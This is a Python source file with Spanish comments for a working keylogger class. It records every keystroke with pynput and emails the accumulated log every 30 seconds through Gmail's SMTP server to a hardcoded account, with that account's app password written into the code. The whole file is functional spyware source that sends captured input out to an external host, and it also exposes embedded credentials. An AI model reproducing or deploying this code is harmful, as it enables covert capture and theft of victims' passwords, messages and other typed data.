#!/usr/bin/env python3

# Importamos los módulos necesarios
import pynput.keyboard  # Para capturar las teclas presionadas
import threading  # Para manejar la ejecución en segundo plano
import smtplib  # Para enviar correos electrónicos
from email.mime.text import MIMEText  # Para manejar el cuerpo del correo en formato de texto

# Definimos la clase principal para el keylogger
class Keylogger:

    def __init__(self):
        # Inicialización de las variables
        self.log = ""  # Donde se almacenarán las teclas presionadas
        self.request_shutdown = False  # Controla si se detiene el keylogger
        self.timer = None  # Temporizador para reportar el registro periódicamente
        self.is_first_run = True  # Marca si es el primer envío de correo

    # Método para manejar teclas presionadas
    def pressed_key(self, key):
        try:
            # Convertimos la tecla presionada a texto y la agregamos al log
            self.log += str(key.char)
        except AttributeError:
            # Manejamos teclas especiales como Espacio, Enter, Shift, etc.
            special_keys = {
                key.space: " [ESPACIO] ",
                key.backspace: " [BORRAR] ",
                key.enter: " [ENTER] ",
                key.shift: " [SHIFT] ",
                key.ctrl: " [CTRL] ",
                key.alt: " [ALT] "
            }
            # Si la tecla es especial, la añadimos al log
            self.log += special_keys.get(key, f" [{str(key)}] ")

    # Método para enviar correos con el registro capturado
    def send_email(self, subject, body, sender, recipients, password):
        # Creamos el mensaje del correo
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        # Configuramos el servidor SMTP para Gmail
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)  # Iniciamos sesión en el servidor
            smtp_server.sendmail(sender, recipients, msg.as_string())  # Enviamos el correo
            print("\n[+] Email enviado exitosamente.\n")

    # Método que envía el reporte del log
    def report(self):
        # Cuerpo del correo que será enviado
        email_body = "[+] El Keylogger se ha iniciado exitosamente" if self.is_first_run else self.log
        # Llamamos a la función de enviar email
        self.send_email(
            "Reporte del Keylogger",
            email_body,
            "hack4utests@gmail.com",
            ["hack4utests@gmail.com"],
            "oqcj coch nspz kbzj"  # Contraseña de la cuenta de envío
        )
        # Reiniciamos el log después de enviarlo
        self.log = ""

        # Cambiamos el estado de la primera ejecución
        if self.is_first_run:
            self.is_first_run = False

        # Si no se ha solicitado detener el keylogger, configuramos un temporizador para el próximo envío
        if not self.request_shutdown:
            self.timer = threading.Timer(30, self.report)  # Enviar cada 30 segundos
            self.timer.start()

    # Método para detener el keylogger
    def shutdown(self):
        self.request_shutdown = True  # Indicamos que debe detenerse
        if self.timer:  # Cancelamos el temporizador si está activo
            self.timer.cancel()

    # Método para iniciar el keylogger
    def start(self):
        # Escuchamos las teclas presionadas
        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key)
        # Reportamos inicialmente
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

